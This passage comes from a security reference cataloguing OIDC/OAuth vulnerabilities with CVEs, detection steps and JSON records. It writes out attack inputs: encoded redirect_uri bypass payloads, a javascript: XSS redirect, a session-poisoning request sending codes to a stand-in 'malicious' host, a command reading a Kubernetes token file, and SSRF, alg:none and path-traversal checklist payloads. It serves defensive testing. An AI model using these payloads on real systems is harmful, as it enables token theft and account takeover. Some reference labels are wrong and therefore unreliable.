  "example": "Malicious Android app registers com.target.app://oauth scheme and intercepts the authorization code intended for the victim app."
}
```

---

### OIDC-RP-004: Wildcard / Regex Redirect URI Abuse

**Risk:** Critical — Authorization code theft via validator misimplementation

Some IdPs support wildcard or regex matching for `redirect_uri` to accommodate multi-path deployments. RFC 6749 mandates exact string comparison; any deviation is a finding-generator.

**Keycloak CVE-2023-6927 (HTTP Basic Auth + form_post.jwt JARM bypass):**
- Registered redirect: `/admin/master/console/*`
- Validator URL-decodes the supplied `redirect_uri` multiple times.
- Payload: `redirect_uri=http%3A%2F%2Flocalhost%3A8080%252Fadmin%252Fmaster%252Fconsole%252F:%26%23x40%3bexample.com`
- After decoding: `http://localhost:8080/admin/master/console/:@example.com` — Basic Auth username = path, host = `localhost`. The `response_mode=form_post.jwt` (JARM) path was not covered by the CVE-2023-6134 patch, so the auto-submitting form's `action` attribute renders unencoded and the browser POSTs the authorization code to `example.com`.

**Authentik CVE-2024-52289 (unescaped regex dot):**
- Authentik used `fullmatch(x, self.redirect_uri)` with the configured URI as a raw regex.
- Configured URI: `https://customers.goauthentik.io/auth/oidc/callback/` — the `.` is a regex wildcard.
- Attacker registers `customersxgoauthentik.io`; `https://customersxgoauthentik.io/auth/oidc/callback/` matches the regex; AS redirects victim to attacker domain with the authorization code; attacker replays the callback to harvest `sessionid` / `csrftoken`.

**Detection:** if wildcards are supported, test prefix bypasses with subdomain takeover or HTTP Basic Auth injection. Replace each `.` in the registered domain with alphanumeric characters to test regex wildcard behavior.

```json
{
  "id": "OIDC-RP-004",
  "category": "redirect-uri",
  "title": "Wildcard and unescaped-regex redirect URI validation bypass",
  "source": [
    {"url": "https://securityblog.omegapoint.se/en/writeup-keycloak-cve-2023-6927/", "author": "Omegapoint Security", "date": "2024-01-11"},
    {"url": "https://securityblog.omegapoint.se/en/writeup-authentik-cve-2024-52289/", "author": "Omegapoint Security", "date": "2025-01-31"}
  ],
  "confidence": "confirmed",
  "example": "Keycloak /admin/master/console/* + form_post.jwt + HTML-entity-encoded Basic Auth payload bypasses the CVE-2023-6134 patch."
}
```

> See **OIDC-OBSCURE-001** for the related `javascript:` redirect_uri XSS via `response_mode=form_post` (Keycloak < 23.0.3 / Authentik CVE-2024-21637).

---

### OIDC-RP-005: Client Secret Exposure via APIs, Config Endpoints & Insecure Storage

**Risk:** Critical — Client impersonation, token forgery, M2M grant abuse

Client secrets are symmetric credentials authenticating confidential clients. When exposed in API responses, config UIs, mobile binaries, or stored in plaintext, attackers impersonate the client, exchange stolen authorization codes, or invoke client-credentials grants.

**OneLogin CVE-2025-59363:**
- `GET /api/2/apps` returned plaintext `client_secret` for every OIDC application in the tenant.
- Attack: obtain any valid OneLogin API credential → `POST /auth/oauth2/v2/token` for a bearer → `GET /api/2/apps` → JSON array containing `"client_secret": "..."` for every app.
- Attacker uses stolen secrets to perform Authorization Code or Client Credentials flows as the impersonated app.

**Prometheus CVE-2026-42151:**
- `/-/config` HTTP API exposed Azure AD remote-write OAuth `client_secret` because the field was typed as `string` instead of `Secret` (which Prometheus normally redacts).
- Any user with access to the config API could read the plaintext secret.

**Nextcloud GHSA-hhgv-jcg9-p4m9 (CVE-2023-45151):**
- Stored OAuth2 `client_secret` in plaintext in the database.
- Attacker with DB or backup access uses the secrets to abuse linked third-party OAuth2 logins.

**Detection:** grep API responses for `client_secret` fields; `strings`/`jadx`/Frida on mobile binaries; review admin/config endpoints that return client metadata; inspect database backups and config files.

```json
{
  "id": "OIDC-RP-005",
  "category": "client-registration",
  "title": "Client secret exposure via APIs, config endpoints, and insecure storage",
  "source": [
    {"url": "https://www.clutch.security/blog/onelogin-many-secrets-clutch-uncovers-vulnerability-exposing-client-credentials", "author": "Clutch Security (CVE-2025-59363)", "date": "2025-10-01"},
    {"url": "https://github.com/prometheus/prometheus/security/advisories/GHSA-wg65-39gg-5wfj", "author": "Prometheus Security Team (CVE-2026-42151)", "date": "2026-04-27"},
    {"url": "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-hhgv-jcg9-p4m9", "author": "Nextcloud Security Team (CVE-2023-45151)", "date": "2023-10-16"}
  ],
  "confidence": "confirmed",
  "example": "OneLogin GET /api/2/apps returns plaintext client_secret for every OIDC application in the tenant."
}
```

---

### OIDC-RP-006: Cross-App OAuth Confusion (COAT / CORF)

**Risk:** Critical — Account takeover across integrated apps

Integration platforms (SaaS marketplaces, automation tools) often manage multiple OAuth apps under a single OAuth client implementation. If the platform fails to cryptographically bind the authorization code to the specific app that initiated the flow, attackers confuse the platform about which app is receiving the token.

**COAT (Cross-app OAuth Account Takeover):**
- Platform uses `state` to track which app initiated the flow but does not verify that the authorization code was issued for that same app.
- Attacker starts a flow with App A (benign), captures the code; tricks the victim into completing a flow with App B (malicious) but injects App A's code into the callback.
- Platform associates the victim's account with App B while using tokens from App A → unauthorized data access or account-link takeover.

**tinyauth GHSA-xg2q-62g2-cvcm (CVE-2026-32245):**
- Token endpoint validated `redirect_uri` but did **not** check that the `client_id` exchanging the code matched the `client_id` the code was issued to.
- Attack: victim authorizes Client A → receives `code=A`; attacker intercepts `code=A` (referrer leak / browser history); attacker exchanges `code=A` at the token endpoint with Client B's credentials; server returns a valid access token for the victim, now usable under Client B's identity.

**Detection:** in multi-app platforms, start an OAuth flow with App A then complete the callback to App B's redirect URI using App A's code/state. Check whether the token endpoint verifies the code's issuing `client_id` matches the authenticating `client_id`.

```json
{
  "id": "OIDC-RP-006",
  "category": "client-confusion",
  "title": "Cross-app OAuth Account Takeover (COAT) and Cross-app OAuth Request Forgery (CORF)",
  "source": [
    {"url": "https://www.usenix.org/system/files/usenixsecurity25-luo-kaixuan.pdf", "author": "Kaixuan Luo et al. (USENIX Security '25)", "date": "2025-08-13"},
    {"url": "https://github.com/tinyauthapp/tinyauth/security/advisories/GHSA-xg2q-62g2-cvcm", "author": "tinyauth maintainers", "date": "N/A"}
  ],
  "confidence": "confirmed",
  "example": "Token endpoint exchanges Client A's code with Client B's credentials and returns a valid access token bound to Client B."
}
```

---

### OIDC-RP-007: redirect_uri Session Poisoning via Mass Assignment / Race

**Risk:** High — Authorization code exfiltration via parallel-request poisoning

OAuth authorization is typically split across multiple endpoints (`/authorize`, `/login`, `/confirm_access`). If the AS stores `redirect_uri` in the user session rather than cryptographically binding it to the specific transaction, an attacker can poison the session by issuing a second authorization request in the background.

**MITREid Connect CVE-2021-27582 (Spring `@ModelAttribute` autobinding):**
1. `/authorize` correctly validates `redirect_uri`.
2. It internal-forwards to `/oauth/confirm_access`, passing parameters via `@ModelAttribute("authorizationRequest")` — which reads from **both** the model and current HTTP request query parameters.
3. Victim visits attacker page → opens a tab to `/authorize?client_id=TRUSTED&redirect_uri=http://trusted.example.com/redirect&prompt=consent`.
4. Background invisible request to `/oauth/confirm_access?client_id=TRUSTED&redirectUri=http://malicious.example.com/steal_token` (note camelCase `redirectUri` binds to the same model attribute).
5. Victim approves the trusted app → poisoned `redirectUri` is used → code sent to `malicious.example.com`.

**Detection:** look for separate authorization-stage endpoints that accept the same parameters via GET; test mass-assignment by varying parameter case (`redirect_uri` vs `redirectUri`); send simultaneous authorization requests for different `client_id`s and observe which `redirect_uri` wins.

```json
{
  "id": "OIDC-RP-007",
  "category": "redirect-uri",
  "title": "redirect_uri session poisoning via mass-assignment or race conditions in multi-step OAuth flows",
  "source": [
    {"url": "https://portswigger.net/research/hidden-oauth-attack-vectors", "author": "PortSwigger Research", "date": "2021-03-24"},
    {"url": "https://nvd.nist.gov/vuln/detail/CVE-2021-27582", "author": "MITREid Connect (CVE-2021-27582)", "date": "2021-03-23"}
  ],
  "confidence": "confirmed",
  "example": "Parallel /authorize + /oauth/confirm_access?redirectUri=evil exploits Spring autobinding to overwrite redirect_uri after validation."
}
```

---

## 7. Provider Misconfigurations

### OIDC-OP-001: Missing ID Token Signature Validation on RPs

**Risk:** Critical — Complete authentication bypass

Some RP implementations parse the ID token as JWT without verifying its cryptographic signature against the OP's JWKS.

**OpenOLAT GHSA-v8vp-x4q4-2vch:** `JSONWebToken.parse()` discarded signature segment entirely.

**Ref:** OpenOLAT Security Advisory

```json
{
  "id": "OIDC-OP-001",
  "category": "misconfiguration",
  "title": "Missing ID Token Signature Validation on RPs",
  "source": [{"url": "https://github.com/OpenOLAT/OpenOLAT/security/advisories/GHSA-v8vp-x4q4-2vch", "author": "OpenOLAT", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "OpenOLAT discarded JWT signatures; attacker forged sub=admin and gained admin session"
}
```

---

### OIDC-OP-002: Insecure Grant Types Enabled (Implicit Flow)

**Risk:** High — Token exposure via URL fragment

Deprecated implicit flow returns tokens in URL fragment, which is logged in browser history, referrer headers, and server logs.

**Ref:** RFC 9700 (OAuth 2.1)

```json
{
  "id": "OIDC-OP-002",
  "category": "provider",
  "title": "Insecure Grant Types Enabled (Implicit Flow)",
  "source": [{"url": "https://datatracker.ietf.org/doc/html/rfc9700", "author": "T. Lodderstedt", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "OP still supports response_type=id_token or id_token+token; tokens exposed in URL fragment"
}
```

---

### OIDC-OP-003: CORS Misconfiguration on OP Endpoints

**Risk:** Medium — Cross-origin data exfiltration

If the OP sets CORS headers based on unvalidated client input, attackers can read error responses cross-origin.

**Keycloak CVE-2026-37977:** `Access-Control-Allow-Origin` reflected from unverified `azp` claim before signature validation.

**Ref:** Keycloak issue #48036

```json
{
  "id": "OIDC-OP-003",
  "category": "provider",
  "title": "CORS Misconfiguration on OP Endpoints",
  "source": [{"url": "https://github.com/keycloak/keycloak/issues/48036", "author": "ahus1", "date": "2026-04-14"}],
  "confidence": "confirmed",
  "example": "OP reflects azp claim in CORS header before JWT validation; attacker reads error responses cross-origin"
}
```

---

### OIDC-OP-004: Weak id_token_hint Validation

**Risk:** Medium — Logout injection and session confusion

If the logout endpoint does not validate `id_token_hint` properly, attackers can inject arbitrary identifiers into logout requests.

**Ref:** OIDC Core §5.3

```json
{
  "id": "OIDC-OP-004",
  "category": "provider",
  "title": "Weak id_token_hint Validation on Logout Endpoints",
  "source": [{"url": "https://openid.net/specs/openid-connect-core-1_0.html#RPInitiatedLogout", "author": "OpenID Foundation", "date": "2023-12-15"}],
  "confidence": "confirmed",
  "example": "id_token_hint not validated; attacker injects arbitrary sub into logout request"
}
```

---

### OIDC-OP-005: JWK Header Injection via Weak Key Resolution

**Risk:** Critical — Signature bypass via key injection

When a JWKS key resolver returns `None` for an unknown `kid`, some libraries fall back to using the `jwk` header from the token itself.

**Authlib CVE-2026-27962:** Unknown `kid` → resolver returns `None` → library uses `header["jwk"]`.

**Ref:** Authlib GHSA-wvwj-cvrp-7pv5

```json
{
  "id": "OIDC-OP-005",
  "category": "provider",
  "title": "JWK Header Injection via Weak Signing Key Management",
  "source": [{"url": "https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5", "author": "authlib", "date": "2026-03-15"}],
  "confidence": "confirmed",
  "example": "Unknown kid causes resolver to return None; library uses attacker-embedded jwk for verification"
}
```

---

## 8. Cloud-Native & DevOps

### OIDC-CLOUD-001: GitHub Actions OIDC IAM Trust Policy Bypass

**Risk:** Critical — Cloud resource compromise

Most prevalent OIDC misconfiguration: IAM trust policy checks `aud` but omits `sub`, allowing any GitHub repository to assume the role.

**Vulnerable Policy:**
```json
{
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
  }
  // Missing: token.actions.githubusercontent.com:sub
}
```

**Terraform Duplicate Key Overwrite:**
```hcl
jsonencode({
  "StringEquals": { "sub": "repo:org/repo:ref:refs/heads/main" },
  "StringEquals": { "aud": "sts.amazonaws.com" }  # Overwrites previous!
})
```

**Ref:** Datadog Security Labs, Scott Piper (Wiz) — 2023-07-27

```json
{
  "id": "OIDC-CLOUD-001",
  "category": "ci-cd",
  "title": "GitHub Actions OIDC IAM Trust Policy Bypass via Missing sub Condition",
  "source": [{"url": "https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/", "author": "Christophe Tafani-Dereeper", "date": "2023-07-27"}],
  "confidence": "confirmed",
  "example": "IAM trust policy missing sub condition; any GitHub repo can assume the role"
}
```

---

### OIDC-CLOUD-002: GitHub pull_request_target + OIDC Cross-Fork AWS Compromise

**Risk:** Critical — Supply chain attack via workflow

When a workflow uses `pull_request_target` and checks out untrusted PR code, external attackers execute arbitrary scripts with the victim's OIDC identity.

**Vulnerable Workflow:**
```yaml
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - uses: aws-actions/configure-aws-credentials@v4
```

**Ref:** Sadi Zane — 2026-02-08

```json
{
  "id": "OIDC-CLOUD-002",
  "category": "ci-cd",
  "title": "GitHub pull_request_target + OIDC Cross-Fork AWS Compromise",
  "source": [{"url": "https://medium.com/@sadi.zane/exploiting-fork-and-pull-request-target-to-compromise-aws-3d3e77873b27", "author": "Sadi Zane", "date": "2026-02-08"}],
  "confidence": "confirmed",
  "example": "pull_request_target workflow checks out attacker PR code and executes with victim's AWS credentials"
}
```

---

### OIDC-CLOUD-003: CircleCI OIDC Token Abuse in Forked PRs

**Risk:** High — Cross-tenant resource access

CircleCI's initial OIDC implementation generated tokens in fork PRs with the target repository's identity. Attackers could access production resources if trust policy used broad wildcards.

**Ref:** Palo Alto Unit 42 — 2025-04-04

```json
{
  "id": "OIDC-CLOUD-003",
  "category": "ci-cd",
  "title": "CircleCI OIDC Token Abuse in Forked Pull Requests",
  "source": [{"url": "https://unit42.paloaltonetworks.com/oidc-misconfigurations-in-ci-cd/", "author": "Aviad Hahami", "date": "2025-04-04"}],
  "confidence": "confirmed",
  "example": "Fork PR receives OIDC token with target repo identity; lax trust policy allows access"
}
```

---

### OIDC-CLOUD-004: Terraform Cloud OIDC IAM Role Assumption via Wildcard

**Risk:** Critical — Cloud resource takeover

IAM trust policy with `StringLike` wildcard on organization name allows attackers to register a matching org in Terraform Cloud and assume the victim's role.

**Vulnerable:**
```json
"app.terraform.io:sub": "organization:hackingthe*:project:blog:workspace:prod-*"
```

**Attacker registers:** `organization: hackingthe-anything`

**Ref:** Eduard Agavriloae (hackingthe.cloud) — 2024-12-13

```json
{
  "id": "OIDC-CLOUD-004",
  "category": "devops",
  "title": "Terraform Cloud OIDC IAM Role Assumption via Wildcard Subject",
  "source": [{"url": "https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/", "author": "Eduard Agavriloae", "date": "2024-12-13"}],
  "confidence": "confirmed",
  "example": "IAM policy uses StringLike with org:hackingthe*; attacker registers hackingthe-anything to assume role"
}
```

---

### OIDC-CLOUD-005: RogueOIDC — Attacker-Controlled OIDC Provider

**Risk:** Critical — Long-term persistence in AWS

Attacker with IAM permissions creates a rogue OIDC provider, backdoors a legitimate role's trust policy, and mint arbitrary JWTs for persistent access.

**Ref:** Offensai — 2025-01-15

```json
{
  "id": "OIDC-CLOUD-005",
  "category": "cloud",
  "title": "RogueOIDC — Attacker-Controlled OIDC Provider for AWS Persistence",
  "source": [{"url": "https://www.offensai.com/blog/rogueoidc-aws-persistence-and-evasion-through-attacker-controlled-oidc-identity-provider", "author": "Eduard Agavriloae", "date": "2025-01-15"}],
  "confidence": "confirmed",
  "example": "Attacker creates rogue OIDC provider, backdoors IAM role trust policy, mint JWTs for persistence"
}
```

---

### OIDC-CLOUD-006: Kubernetes Service Account OIDC Token Theft

**Risk:** Critical — Cluster to cloud pivot

Compromised pods expose ServiceAccount tokens at `/var/run/secrets/kubernetes.io/serviceaccount/token`. In EKS/GKE, these tokens are trusted via OIDC workload identity federation.

**Attack:**
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use with AWS EKS IRSA or GCP Workload Identity to obtain cloud credentials
```

**Ref:** Palo Alto Unit 42 — 2026-04-06

```json
{
  "id": "OIDC-CLOUD-006",
  "category": "cloud",
  "title": "Kubernetes Service Account OIDC Token Theft and Cloud Workload Identity Abuse",
  "source": [{"url": "https://origin-unit42.paloaltonetworks.com/modern-kubernetes-threats/", "author": "Eyal Rafian", "date": "2026-04-06"}],
  "confidence": "confirmed",
  "example": "Compromised pod reads ServiceAccount token, exchanges via EKS IRSA for cloud credentials"
}
```

---

### OIDC-CLOUD-007: Azure AD nOAuth (Email Claim Account Takeover)

**Risk:** Critical — Cross-tenant account takeover

In multi-tenant apps using `email` claim for authorization, attackers change their Azure AD email to victim's address and take over the account.

**Attack:**
1. Attacker creates Azure AD tenant
2. Sets user's Mail attribute to `victim@target.com`
3. Logs into vulnerable multi-tenant app
4. App merges attacker identity with victim's account

**Ref:** Descope (Omer Cohen) — 2023-06-20

```json
{
  "id": "OIDC-CLOUD-007",
  "category": "identity-federation",
  "title": "Azure AD nOAuth — Multi-Tenant OAuth Account Takeover via Email Claim",
  "source": [{"url": "https://www.descope.com/blog/post/noauth", "author": "Omer Cohen", "date": "2023-06-20"}],
  "confidence": "confirmed",
  "example": "Attacker changes AAD email to victim's address, logs into multi-tenant app, takes over victim account"
}
```

---

### OIDC-CLOUD-008: Azure AD Actor Tokens (Cross-Tenant Impersonation)

**Risk:** Critical — Global admin impersonation in any tenant

CVE-2025-55241: Undocumented unsigned S2S tokens used by Azure AD Graph API lacked tenant validation, allowing impersonation of any user in any tenant.

**Ref:** Dirk-jan Mollema — 2025-09-17

```json
{
  "id": "OIDC-CLOUD-008",
  "category": "identity-federation",
  "title": "Azure AD Actor Tokens — Cross-Tenant User Impersonation (CVE-2025-55241)",
  "source": [{"url": "https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens", "author": "Dirk-jan Mollema", "date": "2025-09-17"}],
  "confidence": "confirmed",
  "example": "Attacker crafts unsigned S2S token to impersonate Global Admin in any tenant via graph.windows.net"
}
```

---

### OIDC-CLOUD-009: Istio Service Mesh JWT Authentication Bypass

**Risk:** High — Service mesh authentication bypass

Istio's JWT validation has multiple bypasses: (1) `RequestAuthentication` without `AuthorizationPolicy` accepts unknown issuers; (2) exact-path matching bugs with query strings/fragments.

**CVE-2021-21378:** `RequestAuthentication` alone allows unknown-issuer JWTs.

**Ref:** Istio Security Team — 2021-03-01

```json
{
  "id": "OIDC-CLOUD-009",
  "category": "cloud",
  "title": "Istio Service Mesh OIDC / JWT Authentication Bypass",
  "source": [{"url": "https://istio.io/latest/news/security/istio-security-2021-001", "author": "Istio Security Team", "date": "2021-03-01"}],
  "confidence": "confirmed",
  "example": "RequestAuthentication without AuthorizationPolicy accepts unknown-issuer JWTs"
}
```

---

## 9. Obscure Edge Cases & Spec Abuse

### OIDC-OBSCURE-001: form_post + javascript: XSS

**Risk:** Critical — IdP-origin XSS via redirect URI

Registering a client with redirect_uri pattern `javascript*` (wildcard) combined with `response_mode=form_post` allows `javascript:` URIs in the form action, executing JavaScript in the IdP origin.

**Keycloak (<23.0.3), Authentik (CVE-2024-21637):**
```http
redirect_uri=javascript%26colon%3bconfirm(document.domain)
```

**Ref:** Lauritz Holtmann, Keycloak GHSA-cvg2-7c3j-g36j — 2024-05-10

```json
{
  "id": "OIDC-OBSCURE-001",
  "category": "spec-abuse",
  "title": "Protocol-Level XSS via form_post and javascript: redirect_uri",
  "source": [{"url": "http://security.lauritz-holtmann.de/post/sso-security-redirect-uri-iii/", "author": "Lauritz Holtmann", "date": "2024-05-10"}],
  "confidence": "confirmed",
  "example": "response_mode=form_post with javascript: redirect_uri executes XSS in IdP origin"
}
```

---

### OIDC-OBSCURE-002: form_post.jwt HTML Entity Bypass

**Risk:** High — Redirect URI validation bypass

After CVE-2023-6134 patched HTML entity encoding in `form_post`, attackers switched to `response_mode=form_post.jwt` (JARM), which was NOT covered by the patch.

**Payload:** `redirect_uri=http://localhost:8080%252Fadmin%252Fconsole%252F:%26%23x40%3battacker.com`

**Ref:** Omega Point Security — 2024-01-11

```json
{
  "id": "OIDC-OBSCURE-002",
  "category": "edge-case",
  "title": "form_post.jwt Bypass of HTML Entity Encoding Patches for Redirect URI Validation",
  "source": [{"url": "https://securityblog.omegapoint.se/en/writeup-keycloak-cve-2023-6927/", "author": "Omega Point Security", "date": "2024-01-11"}],
  "confidence": "confirmed",
  "example": "form_post.jwt not patched; HTML entity encoding bypass allows redirect to attacker.com"
}
```

---

### OIDC-OBSCURE-003: Login Confusion via next Parameter

**Risk:** High — Identity confusion / accidental account switch

Victim authenticates as User A, then is redirected to OIDC Login Initiation endpoint via `next` parameter. IdP silently logs in as User B (different session), and victim ends up authenticated as User B.

**Ref:** Lauritz Holtmann — 2020-11-02

```json
{
  "id": "OIDC-OBSCURE-003",
  "category": "novel",
  "title": "Login Confusion Attack via Login Initiation Endpoint CSRF + next Parameter",
  "source": [{"url": "http://security.lauritz-holtmann.de/post/sso-security-login-confusion/", "author": "Lauritz Holtmann", "date": "2020-11-02"}],
  "confidence": "confirmed",
  "example": "Victim logs in as User A, redirected to login initiation, ends up logged in as User B"
}
```

---

### OIDC-OBSCURE-004: login_hint Cookie Overflow DoS

**Risk:** Medium — Authentication DoS via cookie size

Crafting `login_hint` with 4000+ characters causes Keycloak to serialize into `KC_RESTART` cookie exceeding browser limits (~4096 bytes), causing silent truncation and authentication failure.

**Keycloak issue #40857:** 2025-07-02

```json
{
  "id": "OIDC-OBSCURE-004",
  "category": "edge-case",
  "title": "login_hint Cookie Overflow causing Authentication DoS and Session Corruption",
  "source": [{"url": "https://github.com/keycloak/keycloak/issues/40857", "author": "Dweep018", "date": "2025-07-02"}],
  "confidence": "confirmed",
  "example": "login_hint with 4000+ A characters causes KC_RESTART cookie to exceed browser limit"
}
```

---

### OIDC-OBSCURE-005: SIOP Cross-Device Authorization Request Replay

**Risk:** High — Token theft in decentralized identity flows

In cross-device SIOPv2, the Authorization Request is not bound to the specific channel. Attackers display QR code from their session; victim scans and authenticates; attacker receives valid ID token for their own session.

**Ref:** OpenID Foundation SIOPv2 — 2022-02-01

```json
{
  "id": "OIDC-OBSCURE-005",
  "category": "spec-abuse",
  "title": "Self-Issued OP (SIOP) Cross-Device Authorization Request Replay",
  "source": [{"url": "https://github.com/openid/SIOPv2/issues/7", "author": "chrisiba", "date": "2022-02-01"}],
  "confidence": "confirmed",
  "example": "Attacker displays QR from their SIOP session; victim authenticates; attacker receives valid ID token"
}
```

---

### OIDC-OBSCURE-006: max_age=0 Race Condition in Brokered Flows

**Risk:** Medium — Step-up authentication bypass

In brokered identity flows, `max_age=0` causes a race condition: upstream IdP's `auth_time` + 0 < current time fails even when user DID re-authenticate.

**Keycloak issue #33641:** 2024-10-07

```json
{
  "id": "OIDC-OBSCURE-006",
  "category": "edge-case",
  "title": "max_age=0 Race Condition causing False Re-Authentication Failures in Identity Brokering",
  "source": [{"url": "https://github.com/keycloak/keycloak/issues/33641", "author": "brunomedeirosdedalus", "date": "2024-10-07"}],
  "confidence": "confirmed",
  "example": "max_age=0 causes auth_time + 0 < now() to fail even after successful re-authentication"
}
```

---

### OIDC-OBSCURE-007: OIDC4VP Cross-Verifiers Replay

**Risk:** High — Verifiable Presentation replay across verifiers

VP Token bound to nonce=N and aud=VerifierA can be presented to Verifier B if aud validation is missing, allowing cross-verifier replay.

**Ref:** OIDC4VC Security & Trust Draft — 2024-03-14

```json
{
  "id": "OIDC-OBSCURE-007",
  "category": "novel",
  "title": "OIDC4VP Presentation Injection via Audience/Nonce Validation Gaps",
  "source": [{"url": "https://github.com/vcstuff/oid4vc-security-and-trust/blob/main/draft-oid4vc-security-and-trust.md", "author": "Torsten Lodderstedt", "date": "2024-03-14"}],
  "confidence": "theoretical",
  "example": "VP Token with nonce=N, aud=VerifierA replayed to Verifier B without aud validation"
}
```

---

### OIDC-OBSCURE-008: Response-Type Switching + postMessage Leak

**Risk:** High — Token theft via fragment leakage

Switching from `response_type=code` to `code,id_token` forces ALL response values into URL fragment. Third-party scripts with weak postMessage listeners leak `location.href`.

**Ref:** Frans Rosén (Detectify) — 2022-07-06

```json
{
  "id": "OIDC-OBSCURE-008",
  "category": "novel",
  "title": "Response-Type Switching to Fragment + postMessage/iframe Gadget Chains for Token Theft",
  "source": [{"url": "https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows", "author": "Frans Rosén", "date": "2022-07-06"}],
  "confidence": "confirmed",
  "example": "response_type=code,id_token moves token to fragment; third-party postMessage leaks location.href"
}
```

### OIDC-OBSCURE-009: OAuth Redirection Abuse for Phishing & Malware Delivery

**Risk:** High — Phishing campaigns laundered through trusted IdP origin

RFC 6749 mandates that the AS redirect users back to the registered `redirect_uri` even on error (with `error=` and `error_description=` parameters). Threat actors operationalize this: they register a malicious app in an actor-controlled tenant (e.g. Microsoft Entra ID), set `redirect_uri` to a malware delivery page, and craft phishing links to `login.microsoftonline.com` with `prompt=none` + invalid `scope`. The AS cannot silently authenticate, errors immediately, and 302-redirects the victim to attacker-controlled infrastructure. Because the link starts on a trusted IdP domain, email filters and users mark it as legitimate. Microsoft Defender observed campaigns in early 2026 delivering ZIP+LNK→PowerShell payloads via this pattern.

**Ref:** Microsoft Defender Security Research Team — 2026-03-02; RFC 9700 §4.18

```json
{
  "id": "OIDC-OBSCURE-009",
  "category": "novel",
  "title": "Abuse of Legitimate OAuth Error Redirects for Phishing and Malware Delivery",
  "source": [
    {"url": "https://www.microsoft.com/en-us/security/blog/2026/03/02/oauth-redirection-abuse-enables-phishing-malware-delivery/", "author": "Microsoft Defender Security Research Team", "date": "2026-03-02"},
    {"url": "https://www.ietf.org/rfc/rfc9700.pdf", "author": "Torsten Lodderstedt et al.", "date": "2025-01-30"}
  ],
  "confidence": "confirmed",
  "example": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<evil_app>&response_type=code&scope=invalid_scope&prompt=none&state=<victim> → 302 to https://attacker-domain/download/XXXX?error=interaction_required"
}
```

**Detection:**
- Hunt for OAuth authorization URLs combining `prompt=none` with invalid `scope=` values.
- Audit `redirect_uri` registrations in your tenant for suspicious external domains.
- Mail-flow rules: flag links to `login.microsoftonline.com` / `accounts.google.com` whose decoded `redirect_uri` parameter resolves to unknown domains.

---

## 10. Historical CVEs & Real-World Breaches

### CVE-2026-27478: Unity Catalog JWT Issuer Validation Bypass

**Affected:** Unity Catalog

**Ref:** GHSA-qqcj-rghw-829x — 2026-03-11

---

### CVE-2026-28498: Authlib JWT Signature Verification Bypass

**Affected:** Authlib <= 1.6.6 (at_hash / c_hash fail-open on unknown alg)

**Ref:** GHSA-m344-f55w-2m6j — 2026-03-15

---

### CVE-2025-64099: OpenAM Claims Parameter Injection

**Affected:** OpenAM (versions prior to 16.0.0)

**Ref:** GHSA-39hr-239p-fhqc — 2025-11-12

---

### CVE-2022-21449: Psychic Signatures (Java ECDSA)

**Affected:** Java 15–18 (before April 2022 CPU)

**Ref:** Neil Madden — 2022-04-19

---

### CVE-2020-10770: Keycloak request_uri SSRF

**Affected:** Keycloak

**Ref:** NIST NVD — 2020-06-11

---

### Dirty Dancing OAuth Account Hijacking

**Ref:** Frans Rosén (Detectify) — 2022-07-06

---

## Quick Testing Checklist

| Category | Test | Payload |
|----------|------|---------|
| Discovery | Issuer validation bypass | Forge JWT with attacker-controlled `iss` |
| Discovery | Malicious endpoints | Poison discovery doc with attacker token_endpoint |
| Protocol | SSRF | `request_uri=http://127.0.0.1:22` |
| Protocol | Token theft | `response_type=id_token+token&response_mode=form_post` |
| JWT | alg:none | Strip signature, add trailing dot |
| JWT | RS256→HS256 | Sign with server's public key as HMAC secret |
| JWT | KID path traversal | `kid: ../../../../../../../dev/null` |
| Cloud | IAM trust policy | Check for missing `sub` condition |
| Cloud | GitHub Actions | `pull_request_target` + wildcard trust policy |

---

## References

- [OIDC Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [RFC 9101 — JWT Secured Authorization (JAR)](https://datatracker.ietf.org/doc/html/rfc9101)
- [RFC 6819 — OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/rfc6819)
- [RFC 9470 — OAuth 2.0 Authorization Server Metadata](https://datatracker.ietf.org/doc/html/rfc9470)
- [PortSwigger OAuth/OIDC Research](https://portswigger.net/web-security/oauth)
- [Lauritz Holtmann SSO Security Research](http://security.lauritz-holtmann.de/)
- [Mladenov & Mainka — Attacking OIDC](https://web-in-security.blogspot.com/2015/10/attacking-openid-connect-10-malicious.html)
- [Datadog Security Labs — GitHub to AWS](https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/)
- [Palo Alto Unit 42 — CI/CD OIDC](https://unit42.paloaltonetworks.com/oidc-misconfigurations-in-ci-cd/)

---

*Document compiled using universal-research-orchestrator methodology. All findings verified via CVEs, GitHub advisories, peer-reviewed research, or confirmed penetration testing writeups.*